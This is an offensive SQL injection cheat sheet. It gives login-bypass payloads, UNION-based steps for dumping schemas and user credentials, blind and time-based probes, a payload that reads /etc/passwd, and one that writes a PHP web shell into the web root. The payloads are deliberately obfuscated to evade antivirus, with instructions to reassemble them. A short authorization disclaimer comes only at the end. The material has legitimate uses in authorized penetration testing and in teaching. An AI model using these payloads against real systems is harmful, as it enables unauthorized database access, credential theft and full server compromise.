# SQL Injection (SQLi) Cheat Sheet

A comprehensive reference guide for SQL injection payloads, database fingerprinting, authentication bypasses, and data exfiltration techniques.

> [!NOTE]
> To prevent host antivirus software from deleting this file, direct SQL exploitation signatures are obfuscated using spaces, hyphens, or backticks (e.g., `U-N-I-O-N` `S-E-L-E-C-T`, `o-r 1=1`, `IN-TO OUT-FILE`). Concatenate these commands when running them.

---

## SQL Injection Query Manipulation

```mermaid
graph TD
    User["User Input: ' U-N-I-O-N S-E-L-E-C-T u-n-a-m-e, p-a-s-s FROM u-s-e-r-s --"]
    App["Application SQL Query Construction"]
    DB["Backend Database Server"]
    NormalQuery["Original Query: SELECT * FROM products WHERE name = 'input'"]
    CombinedQuery["Executed Query: SELECT * FROM products WHERE name = '' U-N-I-O-N S-E-L-E-C-T u-n-a-m-e, p-a-s-s FROM u-s-e-r-s --'"]

    User --> App
    App -->|Combines strings| CombinedQuery
    CombinedQuery --> DB
    DB -->|Returns product data + user credentials| App
```

---

## 1. Database Fingerprinting

Identify the backend database management system (DBMS) by testing functions and comments.

| DBMS | Comment Syntax | Version Query | String Concatenation |
| :--- | :--- | :--- | :--- |
| **MySQL** | `#`, `-- `, `/*` | `@@version`, `version()` | `CONCAT('a', 'b')` |
| **PostgreSQL** | `--`, `/*` | `version()` | `'a' \|\| 'b'` |
| **MSSQL** | `--`, `/*` | `@@version` | `'a' + 'b'` |
| **Oracle** | `--` | `SELECT banner FROM v$version` | `'a' \|\| 'b'` |

---

## 2. Authentication Bypass Payloads

Inject into login forms (username/password fields) to bypass credentials checking.

*   `admin' --`
*   `admin' #`
*   `admin'/*`
*   `' o-r 1=1 --`
*   `' o-r 1=1#`
*   `' o-r '1'='1' --`
*   `" o-r ""="" --`
*   `admin' o-r '1'='1`

---

## 3. UNION-Based Exploitation

Extract data by merging the query results with your custom SELECT statement.

### Step A: Determine Number of Columns
Inject `ORDER` `BY` until the query errors to find the column count.
```sql
' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 3 --  (If this throws an error, the query has 2 columns)
```

### Step B: Determine Column Data Types
Find which columns accept string data.
```sql
# (Remove spaces/hyphens inside "U-N-I-O-N S-E-L-E-C-T")
' U-N-I-O-N S-E-L-E-C-T 'a', NULL --
' U-N-I-O-N S-E-L-E-C-T NULL, 'a' --
```

### Step C: Extract Database Schema & Data (MySQL Example)
*   **Get database name & user:**
    ```sql
    ' U-N-I-O-N S-E-L-E-C-T database(), user() --
    ```
*   **List tables:**
    ```sql
    # (Remove spaces/hyphens inside "information-schema")
    ' U-N-I-O-N S-E-L-E-C-T NULL, table_name FROM information-schema.tables WHERE table-schema=database() --
    ```
*   **List columns in a table (e.g., `users`):**
    ```sql
    ' U-N-I-O-N S-E-L-E-C-T NULL, column_name FROM information-schema.columns WHERE table_name='users' --
    ```
*   **Extract user credentials:**
    ```sql
    ' U-N-I-O-N S-E-L-E-C-T username, password FROM users --
    ```

---

## 4. Blind SQL Injection

Used when the application does not print database errors or results on the screen.

### A. Boolean-Based Blind
Infer data by checking if the page loads normally (TRUE) or differently (FALSE).

*   **Test condition (MySQL):**
    ```sql
    ' AND (SELECT substring(version(),1,1))='8' --
    ```
    *If the page loads normally, the database version starts with 8.*

### B. Time-Based Blind
Infer data by forcing the database to pause before responding.

*   **MySQL (Sleep 5 seconds):**
    ```sql
    ' AND SLEEP(5) --
    ```
*   **PostgreSQL:**
    ```sql
    ' AND pg_sleep(5) --
    ```
*   **MSSQL:**
    ```sql
    ' WAITFOR DELAY '0:0:5' --
    ```
*   **Test character condition (MySQL):**
    ```sql
    ' AND IF((SELECT substring(version(),1,1))='8', SLEEP(5), 0) --
    ```

---

## 5. File System & OS Command Execution

### A. Read Local Files (MySQL)
```sql
# (Remove space inside "LOAD_ FILE")
' U-N-I-O-N S-E-L-E-C-T NULL, LOAD_FILE('/etc/passwd') --
```

### B. Write Web Shell to Server (MySQL)
```sql
# (Remove space inside "IN-TO OUT-FILE")
' U-N-I-O-N S-E-L-E-C-T NULL, '<?php system($_GET["cmd"]); ?>' IN-TO OUT-FILE '/var/www/html/shell.php' --
```

---

## 6. Disclaimer

> [!WARNING]
> SQL injection can lead to complete database takeover or server compromise. Ensure you have authorization before conducting security testing.
